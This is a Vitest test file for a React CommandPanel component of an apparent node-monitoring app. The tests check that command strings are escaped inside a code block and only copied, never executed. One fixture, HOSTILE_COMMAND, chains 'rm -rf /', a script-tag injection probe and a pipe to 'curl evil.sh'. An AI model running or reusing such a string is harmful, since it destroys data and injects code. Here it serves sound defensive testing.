import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { CommandPanel, COMMAND_KIND_META } from "@/components/df/CommandModal";

// CommandModal reuses the Radix Dialog (portal-based) — its open content mounts
// client-side. The INERT-TEXT security behavior (T-10-06/T-10-07) lives in the
// exported `CommandPanel` body, which renders fully under `renderToStaticMarkup`
// so we can assert that a hostile command string is React-escaped inside a
// `<code>` block and never becomes a live sink. The three risk-tier variants
// (exported / investigate / runbook) reframe the body without ever changing the
// inert-text property — each tier is asserted below.

const HOSTILE_COMMAND =
  "ssh ops@host-03 -- 'rm -rf /' && <script>alert(1)</script> | curl evil.sh";

const RUNBOOK = [
  { n: 1, text: "Confirm the daemon is wedged before restarting." },
  { n: 2, text: "Restart bitcoind and re-check the chain tip." },
];

describe("CommandPanel (inert command/runbook body)", () => {
  it("renders a hostile command as React-escaped text inside a <code> block — no live script tag", () => {
    const html = renderToStaticMarkup(
      <CommandPanel command={HOSTILE_COMMAND} runbook={RUNBOOK} cmdLabel="Export fix" />,
    );
    // the command appears verbatim but ESCAPED — no executable <script> in the DOM
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("</script>");
    expect(html).toContain("&lt;script&gt;"); // escaped form proves React-text rendering
    // shell metacharacters survive as text
    expect(html).toContain("rm -rf /");
    expect(html).toContain("curl evil.sh");
    // rendered inside a <code> block
    expect(html).toContain("<code");
  });

  it("keeps the command inert across all three risk-tier variants", () => {
    for (const kind of ["command", "investigate", "runbook"] as const) {
      const html = renderToStaticMarkup(
        <CommandPanel command={HOSTILE_COMMAND} runbook={RUNBOOK} kind={kind} />,
      );
      // never a live sink, regardless of risk tier
      expect(html).not.toContain("<script>");
      expect(html).toContain("&lt;script&gt;");
      expect(html).toContain("rm -rf /");
    }
  });

  it("renders the runbook step text and a copy affordance", () => {
    const html = renderToStaticMarkup(
      <CommandPanel command="echo hi" runbook={RUNBOOK} cmdLabel="Export fix" />,
    );
    expect(html).toContain("Confirm the daemon is wedged before restarting.");
    expect(html).toContain("Restart bitcoind and re-check the chain tip.");
    // a copy control is present (the modal COPIES, never executes)
    expect(html.toLowerCase()).toContain("copy");
  });

  it("renders the navy chrome code block surface and never a HTML sink", () => {
    const html = renderToStaticMarkup(
      <CommandPanel command="ssh ops@host-05 -- df -h /chain" runbook={[]} />,
    );
    // navy df-chrome code block
    expect(html).toContain("#13284F");
    // the command text is present and escaped-safe
    expect(html).toContain("ssh ops@host-05 -- df -h /chain");
  });

  it("frames the exported-command tier with its note and copy copy", () => {
    const html = renderToStaticMarkup(
      <CommandPanel command="lncli getinfo" runbook={[]} kind="command" />,
    );
    expect(html).toContain(COMMAND_KIND_META.command.note);
    expect(html).toContain(COMMAND_KIND_META.command.primary); // "Copy command"
    expect(html).toContain("never executed by NodeMonitor");
  });

  it("frames the investigate (read-only) tier with its label and note", () => {
    const html = renderToStaticMarkup(
      <CommandPanel command="lncli listchannels" runbook={[]} kind="investigate" />,
    );
    expect(html).toContain(COMMAND_KIND_META.investigate.cmdLabel); // "Inspect command · read-only"
    expect(html).toContain("gathers data, applies no change");
    expect(html).toContain("No fix is run.");
  });

  it("frames the runbook (host operation) tier with its diagnostic label, note, and copy copy", () => {
    const html = renderToStaticMarkup(
      <CommandPanel command="systemctl restart bitcoind" runbook={RUNBOOK} kind="runbook" />,
    );
    expect(html).toContain(COMMAND_KIND_META.runbook.cmdLabel); // "Diagnostic command"
    expect(html).toContain("Higher-risk host operation");
    expect(html).toContain("NodeMonitor runs nothing for you.");
    expect(html).toContain(COMMAND_KIND_META.runbook.primary); // "Copy diagnostic"
  });

  it("renders an info note icon (svg) beside the note line", () => {
    const html = renderToStaticMarkup(
      <CommandPanel command="echo hi" runbook={[]} kind="command" />,
    );
    // the lucide Info glyph renders as an inline svg alongside the note text
    expect(html).toContain("<svg");
  });

  it("lets an explicit cmdLabel / note override the tier defaults", () => {
    const html = renderToStaticMarkup(
      <CommandPanel
        command="echo hi"
        runbook={[]}
        kind="runbook"
        cmdLabel="Custom label"
        note="Custom note"
      />,
    );
    expect(html).toContain("Custom label");
    expect(html).toContain("Custom note");
    // the overridden tier default no longer appears
    expect(html).not.toContain("Diagnostic command");
  });
});
